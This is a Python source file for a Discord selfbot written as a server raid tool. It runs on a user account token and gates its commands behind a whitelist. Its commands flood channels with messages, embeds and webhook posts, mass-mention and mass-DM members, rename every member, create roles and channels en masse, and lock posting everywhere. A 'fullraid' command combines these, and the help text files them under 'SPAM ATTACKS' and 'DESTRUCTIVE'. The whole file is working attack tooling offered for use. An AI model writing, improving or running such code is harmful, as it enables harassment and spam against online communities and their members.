import discord
from discord.ext import commands
import asyncio
import random
import aiohttp
import time
import json
import os
import sys
from datetime import datetime

TOKEN = os.getenv("DISCORD_TOKEN")
if not TOKEN:
    print("ERROR: DISCORD_TOKEN environment variable not set")
    sys.exit(1)

PREFIX = os.getenv("PREFIX", "!")
RATELIMIT_DELAY = float(os.getenv("RATELIMIT_DELAY", "1.2"))
MAX_MESSAGE_LEN = 2000
WHITELIST_FILE = "whitelist.json"

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, self_bot=True, help_command=None, intents=intents)

def load_whitelist():
    if os.path.exists(WHITELIST_FILE):
        with open(WHITELIST_FILE, 'r') as f:
            return json.load(f)
    return []

def save_whitelist(whitelist):
    with open(WHITELIST_FILE, 'w') as f:
        json.dump(whitelist, f, indent=4)

OWNER_ID = int(os.getenv("OWNER_ID", "0"))

whitelist = load_whitelist()
if OWNER_ID != 0 and OWNER_ID not in whitelist:
    whitelist.append(OWNER_ID)
    save_whitelist(whitelist)

def is_whitelisted(ctx):
    return ctx.author.id in whitelist or ctx.author.id == OWNER_ID

class RateLimiter:
    def __init__(self):
        self.last_called = {}
    
    async def wait(self, key):
        now = time.time()
        if key in self.last_called:
            diff = now - self.last_called[key]
            if diff < RATELIMIT_DELAY:
                await asyncio.sleep(RATELIMIT_DELAY - diff)
        self.last_called[key] = time.time()

rate_limiter = RateLimiter()

def log_action(action, target, status="success"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {action} -> {target} [{status}]")

@bot.event
async def on_ready():
    print(f"[+] Selfbot online as {bot.user}")
    print(f"[!] Prefix: {PREFIX}")
    print(f"[!] Owner ID: {OWNER_ID}")
    print(f"[!] Whitelisted users: {len(whitelist)}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(f"❌ {ctx.author.mention} you're not whitelisted.", delete_after=5)
    else:
        log_action("error", str(error), "error")

@bot.command(name='add')
@commands.is_owner()
async def add_user(ctx, user_id: int):
    if user_id not in whitelist:
        whitelist.append(user_id)
        save_whitelist(whitelist)
        await ctx.send(f"✅ added <@{user_id}> to whitelist")
        log_action("whitelist_add", str(user_id))
    else:
        await ctx.send(f"⚠️ <@{user_id}> is already whitelisted")

@bot.command(name='remove')
@commands.is_owner()
async def remove_user(ctx, user_id: int):
    if user_id == OWNER_ID:
        await ctx.send("❌ cannot remove the owner")
        return
    if user_id in whitelist:
        whitelist.remove(user_id)
        save_whitelist(whitelist)
        await ctx.send(f"❌ removed <@{user_id}> from whitelist")
        log_action("whitelist_remove", str(user_id))
    else:
        await ctx.send(f"⚠️ <@{user_id}> wasn't in whitelist")

@bot.command(name='whitelist')
@commands.is_owner()
async def show_whitelist(ctx):
    if not whitelist:
        await ctx.send("📭 whitelist is empty")
        return
    users = []
    for uid in whitelist:
        try:
            user = await bot.fetch_user(uid)
            users.append(f"{user.name} (`{uid}`)")
        except:
            users.append(f"unknown user (`{uid}`)")
    await ctx.send(f"📋 **Whitelisted users ({len(users)}):**\n" + "\n".join(users))

@bot.command(name='wlstatus')
@commands.is_owner()
async def wl_status(ctx, user_id: int = None):
    target = user_id or ctx.author.id
    if target in whitelist or target == OWNER_ID:
        await ctx.send(f"✅ <@{target}> is whitelisted")
    else:
        await ctx.send(f"❌ <@{target}> is NOT whitelisted")

@bot.command(name='spam')
@commands.check(is_whitelisted)
async def spam_cmd(ctx, amount: int = 50, *, message="test"):
    await ctx.message.delete()
    amount = min(amount, 200)
    await rate_limiter.wait("spam")
    for i in range(amount):
        try:
            await ctx.send(f"{message} [{i+1}]" if amount > 1 else message)
            await asyncio.sleep(0.8)
            log_action("spam", f"{amount}x to #{ctx.channel.name}")
        except discord.HTTPException as e:
            log_action("spam", f"failed ({e.status})", "error")
            break

@bot.command(name='embedspam')
@commands.check(is_whitelisted)
async def embedspam_cmd(ctx, amount: int = 30, title="raid", description="active", color=0xff0000):
    await ctx.message.delete()
    amount = min(amount, 100)
    for _ in range(amount):
        embed = discord.Embed(title=title, description=description, color=color)
        embed.set_footer(text=f"requested by {ctx.author.name}")
        try:
            await ctx.send(embed=embed)
            await asyncio.sleep(0.8)
        except:
            break

@bot.command(name='massmention')
@commands.check(is_whitelisted)
async def massmention_cmd(ctx, amount: int = 30):
    await ctx.message.delete()
    members = [m for m in ctx.guild.members if not m.bot][:50]
    msg = " ".join([random.choice(members).mention for _ in range(min(amount, len(members)*2))])
    for chunk in [msg[i:i+MAX_MESSAGE_LEN] for i in range(0, len(msg), MAX_MESSAGE_LEN)]:
        await ctx.send(chunk)
        await asyncio.sleep(1)

@bot.command(name='massdm')
@commands.check(is_whitelisted)
async def massdm_cmd(ctx, *, message="you've been targeted"):
    await ctx.message.delete()
    if len(message) > 500:
        await ctx.send("message too long, keeping under 500 chars")
        return
    success = 0
    for member in ctx.guild.members:
        if member.bot or member == ctx.author:
            continue
        try:
            await member.send(f"**{ctx.author.name}:** {message}\n-# sent via selfbot")
            success += 1
            await asyncio.sleep(1.5)
            log_action("dm", member.name)
        except:
            continue
    await ctx.send(f"dm'd {success}/{len([m for m in ctx.guild.members if not m.bot and m != ctx.author])} members")

@bot.command(name='vcraid')
@commands.check(is_whitelisted)
async def vcraid_cmd(ctx, action="join"):
    await ctx.message.delete()
    if action == "join":
        for vc in ctx.guild.voice_channels:
            try:
                await vc.connect(self_deaf=True)
                await asyncio.sleep(1)
            except:
                continue
    elif action == "move":
        vcs = ctx.guild.voice_channels
        if vcs and bot.voice_clients:
            for vc in bot.voice_clients:
                try:
                    await vc.move_to(random.choice(vcs))
                    await asyncio.sleep(0.5)
                except:
                    continue
    elif action == "disconnect":
        for vc in bot.voice_clients:
            await vc.disconnect()

@bot.command(name='reactraid')
@commands.check(is_whitelisted)
async def reactraid_cmd(ctx, amount: int = 50):
    await ctx.message.delete()
    reactions = ["🔥","💀","⚡","🩸","👀","🚀","🌀","🎯","⚠️","💢"]
    count = 0
    async for msg in ctx.channel.history(limit=min(amount, 100)):
        if count >= amount:
            break
        try:
            await msg.add_reaction(random.choice(reactions))
            count += 1
            await asyncio.sleep(0.5)
        except:
            continue
    log_action("reactraid", f"{count} reactions on #{ctx.channel.name}")

@bot.command(name='fullraid')
@commands.check(is_whitelisted)
async def fullraid_cmd(ctx):
    await ctx.message.delete()
    await ctx.send("🚨 **INITIATING RAID PROTOCOL** 🚨")
    tasks = [
        spam_cmd(ctx, 60, "R A I D   M O D E"),
        embedspam_cmd(ctx, 40, "RAID", "your server is being targeted", 0xff0000),
        massmention_cmd(ctx, 25),
        reactraid_cmd(ctx, 30)
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    await ctx.send(f"✅ raid complete | {len([r for r in results if not isinstance(r, Exception)])}/4 tasks succeeded")

@bot.command(name='purge')
@commands.check(is_whitelisted)
async def purge_cmd(ctx, amount: int = 50):
    await ctx.message.delete()
    deleted = 0
    async for msg in ctx.channel.history(limit=min(amount, 200)):
        if msg.author == bot.user:
            try:
                await msg.delete()
                deleted += 1
                await asyncio.sleep(0.4)
            except:
                continue
    await ctx.send(f"🧹 purged {deleted} messages", delete_after=3)

@bot.command(name='channelcloner')
@commands.check(is_whitelisted)
async def channelcloner_cmd(ctx, channel: discord.TextChannel = None):
    await ctx.message.delete()
    target = channel or ctx.channel
    for _ in range(10):
        await ctx.guild.create_text_channel(
            name=f"{target.name}-clone",
            topic=target.topic or "cloned channel",
            category=target.category
        )
        await asyncio.sleep(0.7)
    log_action("channelcloner", f"10 clones of #{target.name}")

@bot.command(name='rolegenerator')
@commands.check(is_whitelisted)
async def rolegenerator_cmd(ctx, amount: int = 15, name="RAIDED"):
    await ctx.message.delete()
    colors = [0xff0000, 0x00ff00, 0x0000ff, 0xff00ff, 0xffff00]
    for i in range(min(amount, 30)):
        try:
            await ctx.guild.create_role(name=f"{name}-{i+1}", color=random.choice(colors), hoist=True)
            await asyncio.sleep(0.8)
        except:
            break
    log_action("rolegenerator", f"{amount} roles")

@bot.command(name='nickcycler')
@commands.check(is_whitelisted)
async def nickcycler_cmd(ctx, *nicks):
    await ctx.message.delete()
    names = list(nicks) if nicks else ["raided", "destroyed", "owned", "rekt", "gone"]
    for member in ctx.guild.members:
        if member.bot or member == ctx.guild.owner:
            continue
        try:
            await member.edit(nick=random.choice(names))
            await asyncio.sleep(0.8)
        except:
            continue

@bot.command(name='statusrotator')
@commands.check(is_whitelisted)
async def statusrotator_cmd(ctx, interval: int = 5):
    await ctx.message.delete()
    statuses = [
        discord.Game(name="raid mode active"),
        discord.Streaming(name="raiding servers", url="https://twitch.tv/placeholder"),
        discord.CustomActivity(name="target acquired")
    ]
    try:
        while True:
            for activity in statuses:
                await bot.change_presence(activity=activity)
                await asyncio.sleep(interval)
    except asyncio.CancelledError:
        pass

@bot.command(name='slowmode')
@commands.check(is_whitelisted)
async def slowmode_cmd(ctx, seconds: int = 0):
    await ctx.message.delete()
    if seconds > 21600:
        seconds = 21600
    await ctx.channel.edit(slowmode_delay=seconds)
    log_action("slowmode", f"#{ctx.channel.name} set to {seconds}s")

@bot.command(name='webhookspam')
@commands.check(is_whitelisted)
async def webhookspam_cmd(ctx, amount: int = 20, *, content="webhook raid"):
    await ctx.message.delete()
    webhook = await ctx.channel.create_webhook(name="raid-tool")
    for _ in range(min(amount, 50)):
        await webhook.send(content, username=random.choice(["xander", "eden", "vuzxk"]))
        await asyncio.sleep(0.3)
    await webhook.delete()
    log_action("webhookspam", f"{amount} messages")

@bot.command(name='lockdown')
@commands.check(is_whitelisted)
async def lockdown_cmd(ctx, role: discord.Role = None):
    await ctx.message.delete()
    target_role = role or ctx.guild.default_role
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(target_role, send_messages=False)
            await asyncio.sleep(0.3)
        except:
            continue
    await ctx.send("🔒 server lockdown initiated", delete_after=5)

@bot.command(name='help')
@commands.check(is_whitelisted)
async def help_cmd(ctx, command: str = None):
    await ctx.message.delete()
    if command:
        cmd = bot.get_command(command)
        if cmd:
            help_text = f"**!{cmd.name}**\n{cmd.help or 'no description'}\nUsage: `{PREFIX}{cmd.name} {cmd.signature}`"
            await ctx.send(help_text)
            return
    await ctx.send(f"""```
🔥 SELF-BOT v2 🔥

SPAM ATTACKS:
  !spam <amount> <text>           - message spam
  !embedspam <amount> [title] [desc] [color]
  !massmention <amount>           - mass member mentions
  !webhookspam <amount> <text>    - webhook-based spam

DESTRUCTIVE:
  !fullraid                       - all-in-one attack
  !purge <amount>                 - delete your messages
  !channelcloner [channel]        - clone channel 10x
  !rolegenerator <amount> [name]  - mass role creation
  !nickcycler [names...]          - random nick changes
  !lockdown [role]                - disable sending everywhere

UTILITY:
  !massdm <message>               - DM all members
  !vcraid <join/move/disconnect>  - voice channel control
  !reactraid <amount>             - reaction flood
  !statusrotator <interval_sec>   - cycle game status
  !slowmode <seconds>             - change channel slowmode
  !add <user_id>                  - owner: add to whitelist
  !remove <user_id>               - owner: remove from whitelist
  !whitelist                      - owner: show whitelist
  !wlstatus [user_id]             - owner: check whitelist status

INFO:
  !help [command]                 - show this or command-specific

⚠️ rate limits: 1.2s delay, max 200 messages per command
```""")

if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except KeyboardInterrupt:
        print("\n[!] shutting down")
        asyncio.run(bot.close())
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)
